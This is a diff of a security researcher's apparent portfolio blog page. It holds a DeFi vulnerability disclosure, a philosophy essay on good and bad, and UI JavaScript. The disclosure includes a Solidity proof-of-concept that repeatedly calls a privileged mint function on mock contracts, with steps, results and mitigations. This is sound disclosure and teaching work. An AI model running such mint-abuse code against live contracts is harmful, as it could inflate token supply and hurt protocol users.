+    event LogSupply(uint256 supply);
+    
+    constructor() public {
+        // Deploy mock tokens
+        underlying = new ERC20Mock();
+        ctoken = new CErc20Mock(address(underlying));
+        
+        // Deploy Fed with this contract as gov
+        fed = new Fed(ctoken, address(this));
+    }
+    
+    function runExploit() public {
+        // Initial state
+        emit LogSupply(underlying.totalSupply());
+        
+        // Exploit 1: Mint a large amount multiple times to show no restrictions
+        for(uint i = 0; i < 5; i++) {
+            fed.expansion(1000000 * 10**18); // 1 million tokens each time
+            emit LogSupply(underlying.totalSupply());
+        }
+    }
+    
+    // Additional function to show minting can be done repeatedly
+    function mintMore(uint256 amount) public {
+        fed.expansion(amount);
+        emit LogSupply(underlying.totalSupply());
+    }
+}</pre>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Exploitation Steps</h3>
+                    <ol class="list-decimal pl-6 space-y-2">
+                        <li>Deploy the FedExploitTest contract</li>
+                        <li>Call runExploit() to mint 5 million tokens (5 iterations of 1M * 10^18)</li>
+                        <li>Call mintMore(1000000000000000000000000) multiple times to mint additional 1M tokens without restrictions</li>
+                    </ol>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Results</h3>
+                    <p>From the initial supply of 0, I was able to mint unlimited tokens in rapid succession:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li>After 1st mint: 1,000,000 tokens</li>
+                        <li>After 2nd mint: 2,000,000 tokens</li>
+                        <li>After 3rd mint: 3,000,000 tokens</li>
+                        <li>After 4th mint: 4,000,000 tokens</li>
+                        <li>After 5th mint: 5,000,000 tokens</li>
+                        <li>After additional calls: 8,000,000 tokens total</li>
+                    </ul>
+                    <p>This demonstrated that the chair could mint any amount of tokens without limits or delays, potentially destabilizing the entire protocol.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Observations and Analysis</h3>
+                    <p>Through my analysis, I observed several key issues with the Fed contract's design:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li>The chair (deployer) could mint tokens with no limits or delays, allowing for arbitrary inflation</li>
+                        <li>Additional mints succeeded immediately in separate transactions, confirming no cooldown</li>
+                        <li>Even if the chair was intended to be a trusted entity (e.g., a multi-sig), the lack of on-chain limits remained a concern</li>
+                        <li>The vulnerability could affect the entire ecosystem due to the token's role in the protocol</li>
+                    </ul>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Recommended Mitigation Strategies</h3>
+                    <p>To address this vulnerability, I recommended several mitigation strategies:</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">1. Implement Maximum Mint Limits</h4>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+// Add protocol-wide configuration
+uint256 public maxMintAmount;
+
+function expansion(uint amount) public {
+    require(msg.sender == chair, "ONLY CHAIR");
+    require(amount <= maxMintAmount, "AMOUNT EXCEEDS MAXIMUM");
+    // ... rest of the function
+}</pre>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">2. Add Timelock Mechanism</h4>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+// Add cooldown period
+uint256 public lastMintTimestamp;
+uint256 public constant MINT_COOLDOWN = 1 days;
+
+function expansion(uint amount) public {
+    require(msg.sender == chair, "ONLY CHAIR");
+    require(block.timestamp >= lastMintTimestamp + MINT_COOLDOWN, "COOLDOWN ACTIVE");
+    
+    // ... rest of the function
+    
+    lastMintTimestamp = block.timestamp;
+}</pre>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">3. Implement Multi-signature Requirements</h4>
+                    <p>Replace the single chair role with a multi-signature mechanism requiring approval from multiple authorized entities, significantly reducing the risk of compromise or misuse.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">The Vendor's Response</h3>
+                    <p>After reporting this issue through the protocol's bug bounty program, the security team determined that the vulnerability was out of scope for a reward. Their rationale was that attacks requiring access to privileged addresses (including governance and strategist contracts) without additional modifications to the privileges were excluded from the bounty program.</p>
+                    <p>While I understand their perspective based on the specific terms of the bug bounty program, I maintain that unlimited minting with no cooldown could destabilize the token's peg even if the chair is a multi-sig. Past DeFi exploits have shown that privileged roles can be compromised, and on-chain limits would provide a valuable safety net.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Lessons Learned</h3>
+                    <p>This vulnerability highlights several important principles for secure DeFi development:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li><strong>Defense in Depth:</strong> Even trusted roles should have on-chain constraints to minimize damage if compromised</li>
+                        <li><strong>Economic Safety Guards:</strong> DeFi protocols should implement mechanisms to prevent economic attacks, such as rate limits and maximum caps</li>
+                        <li><strong>Trust Minimization:</strong> While administrative privileges are often necessary, their power should be constrained through technical measures</li>
+                        <li><strong>Multi-layer Security:</strong> Combine access controls with parameter bounds, timelocks, and monitoring systems</li>
+                    </ul>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Conclusion</h3>
+                    <p>Despite not qualifying for a bounty under the program's specific terms, disclosing this vulnerability was still valuable for the wider security community. It demonstrates how even protocol-level controls and privileged operations should incorporate safeguards against potential abuse or compromise.</p>
+                    <p>The DeFi ecosystem continues to evolve, and security must evolve with it. By discussing these issues openly, we contribute to a more secure Web3 environment that can better protect user funds and protocol stability.</p>
+                `
+            },
+            'good-vs-bad': {
+                title: "Good vs. Bad: Are We Seeing Truth or Just Our Own Biases?",
+                category: "Philosophy",
+                date: "March 22, 2025",
+                severity: "N/A",
+                reward: "N/A",
+                cvss: "N/A",
+                vector: "N/A",
+                content: `
+                    <p>Is there such a thing as "good" or "bad," or are these labels simply reflections of our personal biases? This question has echoed through the halls of philosophy for centuries, challenging us to examine the nature of morality, value judgments, and human perception. Are good and bad objective truths that exist beyond our opinions, or are they subjective creations shaped by our individual experiences and cultural contexts? In this blog post, we'll dive into this timeless debate, exploring the arguments for both sides and considering whether a middle ground might offer the most insight.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Defining the Terms</h3>
+                    <p>Before we begin, let's clarify what we mean by the key terms in this discussion:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li><strong>Good and Bad:</strong> These words often apply to moral judgments (e.g., "helping others is good," "lying is bad"), but they can also describe aesthetic preferences (e.g., "this song is good") or practical evaluations (e.g., "this knife is bad for cutting"). Their meaning shifts depending on context.</li>
+                        <li><strong>Real:</strong> Here, "real" implies that good and bad exist independently of our thoughts or feelings - like the laws of physics exist whether we believe in them or not.</li>
+                        <li><strong>Personal Biases:</strong> These are the subjective lenses we each carry, shaped by our upbringing, culture, emotions, and experiences. Biases influence how we see the world, often unconsciously.</li>
+                    </ul>
+                    <p>With these definitions in hand, the core question becomes: Are good and bad universal truths, or are they just products of our personal perspectives?</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">The Objective View: Good and Bad as Universal Truths</h3>
+                    <p>One side of the debate argues that good and bad are real and objective, existing independently of what we think or feel. This perspective, often called moral realism in ethics, suggests that certain actions or qualities have an inherent moral value.</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Evidence for Objectivity</h4>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li><strong>Moral Universals:</strong> Some actions seem universally condemned - like torturing innocent people for no reason - or universally praised, like selfless acts of kindness. These patterns suggest that good and bad might transcend personal opinion.</li>
+                        <li><strong>Reason-Based Standards:</strong> Philosophers like Immanuel Kant believed that moral truths could be discovered through reason. His Categorical Imperative argues that actions are good or bad based on universal principles, not individual whims.</li>
+                        <li><strong>Beyond Morality:</strong> In aesthetics, some claim beauty follows objective rules (e.g., the Golden Ratio in art or nature). In practical terms, a tool's "goodness" can be measured by how well it performs its job - a good hammer drives nails efficiently, a bad one doesn't.</li>
+                    </ul>
+                    <blockquote class="border-l-4 border-primary pl-6 py-2 my-8 italic text-slate-300">
+                        "Act only according to that maxim whereby you can, at the same time, will that it should become a universal law." - Immanuel Kant, Groundwork of the Metaphysics of Morals
+                    </blockquote>
+                    <p>If good and bad are objective, then there's a "right" answer to questions of value, and our job is to uncover it.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">The Subjective View: Good and Bad as Personal Constructs</h3>
+                    <p>On the flip side, many argue that good and bad are subjective, entirely dependent on personal biases and cultural contexts. This view aligns with moral relativism, which holds that value judgments vary across individuals and societies.</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Evidence for Subjectivity</h4>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li><strong>Cultural Differences:</strong> What's "good" in one culture might be "bad" in another. For example, some societies revere eating certain animals, while others find it abhorrent. Historically, practices like polygamy or slavery were once accepted but are now widely rejected.</li>
+                        <li><strong>Personal Variation:</strong> Even within a single culture, people disagree on what's good or bad - think of debates over politics, art, or lifestyle choices. These differences often stem from upbringing, emotions, or unique experiences.</li>
+                        <li><strong>Aesthetic Tastes:</strong> The phrase "beauty is in the eye of the beholder" captures the idea that artistic "goodness" is a matter of personal preference, not universal truth.</li>
+                    </ul>
+                    <blockquote class="border-l-4 border-primary pl-6 py-2 my-8 italic text-slate-300">
+                        "There is nothing either good or bad, but thinking makes it so." - William Shakespeare, Hamlet
+                    </blockquote>
+                    <p>If good and bad are subjective, then they're little more than personal biases writ large - no one's view is inherently "truer" than another's.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">The Intersubjective Middle Ground: Good and Bad as Social Agreements</h3>
+                    <p>A third perspective offers a compromise: good and bad might not be purely objective or subjective but intersubjective - created through collective human agreement. In this view, they're social constructs that emerge from shared values and interactions.</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Evidence for Intersubjectivity</h4>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li><strong>Social Norms:</strong> Laws and customs define good and bad within a community. For instance, honesty might be "good" because a society agrees it fosters trust.</li>
+                        <li><strong>Language and Meaning:</strong> The words "good" and "bad" gain their power from how we use them together. Their meanings evolve with cultural consensus.</li>
+                        <li><strong>Shared Values:</strong> Anthropologists note that some principles - like bans on murder or theft - appear across nearly all human societies, hinting at a common moral foundation.</li>
+                    </ul>
+                    <p>Yet, intersubjectivity doesn't eliminate variation. What's "good" in one society (e.g., communal living) might be "bad" in another (e.g., valuing individualism), showing that even collective agreement has limits.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">The Role of Personal Biases</h3>
+                    <p>No matter where good and bad come from, our personal biases shape how we perceive them. Cognitive biases - like confirmation bias (favoring evidence that supports our beliefs) - and emotional reactions - like disgust or empathy - filter our judgments.</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Examples</h4>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li>A person raised in a strict household might see rule-breaking as "bad," while someone from a freer environment might not.</li>
+                        <li>Empathy might lead us to call an act "good" because it helps others, but our definition of "help" depends on our own values.</li>
+                    </ul>
+                    <p>This raises a key question: If biases cloud our views, can we ever know if good and bad are "real"? Or are we stuck seeing only shadows of the truth?</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Bridging the Gap: Objective Roots, Subjective Filters</h3>
+                    <p>Perhaps good and bad aren't all one thing or the other. There may be objective foundations - facts about the world or human nature - that anchor these concepts, even as our subjective biases shape how we interpret them.</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Objective Anchors</h4>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li><strong>Human Nature:</strong> Evolution suggests that traits like cooperation (often "good") aid survival, while harm (often "bad") threatens it. These patterns might give good and bad a biological basis.</li>
+                        <li><strong>Cause and Effect:</strong> Some actions objectively cause pain or pleasure. Calling pain "bad" and pleasure "good" could reflect real states of affairs, even if our thresholds differ.</li>
+                        <li><strong>Functionality:</strong> A tool's goodness can be tied to measurable outcomes - does it work as intended? - though the "intention" itself is human-defined.</li>
+                    </ul>
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Subjective Filters</h4>
+                    <p>Our personal and cultural lenses determine how we apply these anchors. One person's "pleasure" might be another's "pain," and one society's "survival strategy" might clash with another's.</p>
+                    <p>This blend suggests that good and bad have a footing in reality but are experienced through the haze of our biases.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Why It Matters</h3>
+                    <p>How we answer this question shapes how we live:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li>If good and bad are objective, we should seek universal truths to guide our actions - think global human rights or timeless ethical codes. But this risks ignoring diverse perspectives.</li>
+                        <li>If they're subjective, we gain freedom to define our own values, but we lose the ability to judge harmful practices beyond saying, "That's just my opinion."</li>
+                        <li>If they're intersubjective, we must build shared understanding, balancing consensus with respect for differences - though conflicts between groups remain tricky.</li>
+                    </ul>
+                    <blockquote class="border-l-4 border-primary pl-6 py-2 my-8 italic text-slate-300">
+                        "The line separating good and evil passes not through states, nor between classes, nor between political parties - but right through every human heart." - Aleksandr Solzhenitsyn
+                    </blockquote>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">A Nuanced Takeaway</h3>
+                    <p>So, are good and bad real, or just personal biases? The truth likely lies in a mix of perspectives. There are objective elements - rooted in human needs, outcomes, and shared experiences - that give these concepts substance. Yet, our personal biases - from culture to emotion - inescapably shape how we see them.</p>
+                    <p>Even if good and bad aren't fully "real" in an absolute sense, they're vital tools for navigating life. We use them to make choices, connect with others, and build societies. Rather than settling the debate, we might do better to keep exploring it - using reason, empathy, and dialogue to refine our grasp of what "good" and "bad" mean in a complex world.</p>
+                    <p>What do you think - do good and bad exist out there, or are they just in our heads? Let's keep the conversation going.</p>
+                `
+            }
+        };
+
+        // Mobile menu toggle logic
+        const menuToggle = document.getElementById('menu-toggle');
+        const mobileMenu = document.getElementById('mobile-menu');
+        const menuIcon = menuToggle.querySelector('.menu-icon');
+        const closeIcon = menuToggle.querySelector('.close-icon');
+
+        menuToggle.addEventListener('click', () => {
+            const isHidden = mobileMenu.classList.contains('hidden');
+            if (isHidden) {
+                mobileMenu.classList.remove('hidden');
+                menuIcon.classList.add('hidden');
+                closeIcon.classList.remove('hidden');
+                document.body.style.overflow = 'hidden';
+            } else {
+                mobileMenu.classList.add('hidden');
+                menuIcon.classList.remove('hidden');
+                closeIcon.classList.add('hidden');
+                document.body.style.overflow = '';
+            }
+            lucide.createIcons();
+        });
+
+        // Close mobile menu on link click
+        document.querySelectorAll('.mobile-nav-link').forEach(link => {
+            link.addEventListener('click', () => {
+                mobileMenu.classList.add('hidden');
+                menuIcon.classList.remove('hidden');
+                closeIcon.classList.add('hidden');
+                document.body.style.overflow = '';
+                lucide.createIcons();
+            });
+        });
+
+        // Header Scroll Effect
+        const header = document.getElementById('main-header');
+        window.addEventListener('scroll', () => {
+            if (window.scrollY > 50) {
+                header.classList.add('header-scrolled');
+            } else {
+                header.classList.remove('header-scrolled');
             }
         });
-    </script>
-    
-    <!-- Service worker registration for offline functionality -->
-    <script>
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', () => {
-                navigator.serviceWorker.register('/sw.js').then(registration => {
-                    console.log('ServiceWorker registered with scope:', registration.scope);
-                }).catch(error => {
-                    console.log('ServiceWorker registration failed:', error);
+
+        // Smooth Scroll for all anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                const href = this.getAttribute('href');
+                if (href === '#') return;
+                
+                const target = document.querySelector(href);
+                if (target) {
+                    e.preventDefault();
+                    target.scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+        const blogModal = document.getElementById('blog-modal');
+        const closeModalBtn = document.getElementById('close-modal');
+        const modalShareBtn = document.getElementById('modal-share');
+
+        function openBlogModal(postId) {
+            const post = blogPosts[postId];
+            if (!post) return;
+
+            // Store current post ID for sharing
+            blogModal.setAttribute('data-current-post', postId);
+
+            // Define category colors
+            const categoryColors = {
+                'Android Security': '#00FFC2',
+                'Web Security': '#FFB800',
+                'Web3 Security': '#FF00E5',
+                'Philosophy': '#00A3FF'
+            };
+            const accentColor = categoryColors[post.category] || '#00FFC2';
+
+            // Populate Modal
+            const modalTitle = document.getElementById('modal-title');
+            modalTitle.innerText = post.title;
+            modalTitle.style.setProperty('--card-accent', accentColor);
+            
+            document.getElementById('modal-category-tag').innerText = post.category;
+            document.getElementById('modal-date').innerText = post.date;
+            
+            const severityEl = document.getElementById('modal-severity');
+            severityEl.innerText = post.severity;
+            severityEl.style.color = accentColor;
+            
+            document.getElementById('modal-reward').innerText = post.reward;
+            document.getElementById('modal-cvss').innerText = post.cvss;
+            document.getElementById('modal-vector').innerText = post.vector;
+            
+            // Process content to wrap pre tags in cool containers
+            let content = post.content;
+            const tempDiv = document.createElement('div');
+            tempDiv.innerHTML = content;
+            
+            const preTags = tempDiv.querySelectorAll('pre');
+            preTags.forEach((pre, index) => {
+                const container = document.createElement('div');
+                container.className = 'code-block-container';
+                
+                const header = document.createElement('div');
+                header.className = 'code-block-header';
+                
+                const dots = document.createElement('div');
+                dots.className = 'terminal-dots';
+                dots.innerHTML = `
+                    <div class="terminal-dot bg-[#ff5f56]"></div>
+                    <div class="terminal-dot bg-[#ffbd2e]"></div>
+                    <div class="terminal-dot bg-[#27c93f]"></div>
+                `;
+                
+                const label = document.createElement('span');
+                label.innerText = `SRC_FILE_0${index + 1}.LOG`;
+                
+                header.appendChild(dots);
+                header.appendChild(label);
+                
+                const newPre = pre.cloneNode(true);
+                newPre.className = 'p-6 overflow-x-auto text-xs font-mono leading-relaxed';
+                newPre.style.color = accentColor; // Use category accent color for code
+                newPre.style.background = 'transparent';
+                newPre.style.border = 'none';
+                newPre.style.margin = '0';
+                
+                container.appendChild(header);
+                container.appendChild(newPre);
+                
+                pre.parentNode.replaceChild(container, pre);
+            });
+            
+            document.getElementById('modal-body').innerHTML = tempDiv.innerHTML;
+
+            // Initialize Mermaid if present
+            if (tempDiv.querySelector('.mermaid')) {
+                mermaid.initialize({
+                    startOnLoad: false,
+                    theme: 'dark',
+                    securityLevel: 'loose',
+                    flowchart: {
+                        useMaxWidth: false,
+                        htmlLabels: true,
+                        curve: 'basis'
+                    }
+                });
+                mermaid.init(undefined, document.querySelectorAll('.mermaid'));
+            }
+
+            // Show Modal
+            blogModal.classList.remove('hidden');
+            document.body.style.overflow = 'hidden'; // Prevent background scroll
+            
+            // Re-initialize icons for the modal
+            lucide.createIcons();
+        }
+
+        // Share functionality
+        modalShareBtn.addEventListener('click', async () => {
+            const postId = blogModal.getAttribute('data-current-post');
+            const post = blogPosts[postId];
+            const shareData = {
+                title: post.title,
+                text: `Check out this security intel: ${post.title}`,
+                url: window.location.href.split('#')[0] + '#' + postId
+            };
+
+            try {
+                if (navigator.share) {
+                    await navigator.share(shareData);
+                } else {
+                    await navigator.clipboard.writeText(shareData.url);
+                    const originalHTML = modalShareBtn.innerHTML;
+                    modalShareBtn.innerHTML = '<i data-lucide="check" class="w-5 h-5 text-primary"></i>';
+                    lucide.createIcons();
+                    setTimeout(() => {
+                        modalShareBtn.innerHTML = originalHTML;
+                        lucide.createIcons();
+                    }, 2000);
+                }
+            } catch (err) {
+                console.error('Share failed:', err);
+            }
+        });
+
+        closeModalBtn.addEventListener('click', () => {
+            blogModal.classList.add('hidden');
+            document.body.style.overflow = ''; // Restore scroll
+        });
+
+        // Close on background click
+        blogModal.addEventListener('click', (e) => {
+            if (e.target === blogModal) {
+                blogModal.classList.add('hidden');
+                document.body.style.overflow = '';
+            }
+        });
+
+        // Initialize Lucide icons
+        lucide.createIcons();
+
+        // Blog Filtering Logic
+        const filterBtns = document.querySelectorAll('.filter-btn');
+        const blogCards = document.querySelectorAll('.blog-card');
+
+        filterBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                // Update active button styling
+                filterBtns.forEach(b => {
+                    b.classList.remove('active', 'border-primary/50', 'bg-white/10', 'text-white');
+                    b.classList.add('border-white/10', 'bg-white/5', 'text-slate-400');
+                });
+                btn.classList.add('active', 'border-primary/50', 'bg-white/10', 'text-white');
+                btn.classList.remove('border-white/10', 'bg-white/5', 'text-slate-400');
+
+                const category = btn.getAttribute('data-category');
+
+                blogCards.forEach(card => {
+                    if (category === 'all' || card.getAttribute('data-category') === category) {
+                        card.style.display = 'flex';
+                        // Trigger a small animation
+                        card.style.opacity = '0';
+                        setTimeout(() => {
+                            card.style.opacity = '1';
+                            card.style.transform = 'translateY(0)';
+                        }, 50);
+                    } else {
+                        card.style.display = 'none';
+                    }
                 });
             });
+        });
+
+        // Hall of Fame Slider Logic
+        const slider = document.getElementById('hof-slider');
+        const prevBtn = document.getElementById('prev-btn');
+        const nextBtn = document.getElementById('next-btn');
+
+        if (slider && prevBtn && nextBtn) {
+            prevBtn.addEventListener('click', () => {
+                slider.scrollBy({ left: -300, behavior: 'smooth' });
+            });
+
+            nextBtn.addEventListener('click', () => {
+                slider.scrollBy({ left: 300, behavior: 'smooth' });
+            });
         }
+
+        // Fallback for broken logos
+        document.querySelectorAll('.hof-logo').forEach(img => {
+            img.addEventListener('error', function() {
+                const domain = this.alt.toLowerCase();
+                console.log(`Logo failed for ${domain}, trying fallback...`);
+                
+                // Try Google Favicon service as a fallback (very reliable)
+                const fallbackUrl = `https://www.google.com/s2/favicons?domain=${domain}.com&sz=128`;
+                
+                if (this.src !== fallbackUrl) {
+                    this.src = fallbackUrl;
+                } else {
+                    // If even Google Favicon fails, show a text-based placeholder
+                    const parent = this.parentElement;
+                    if (parent) {
+                        parent.innerHTML = `<div class="text-black font-black text-3xl select-none">${domain[0].toUpperCase()}</div>`;
+                    }
+                }
+            });
+        });
     </script>
 </body>
-</html> 
+</html>
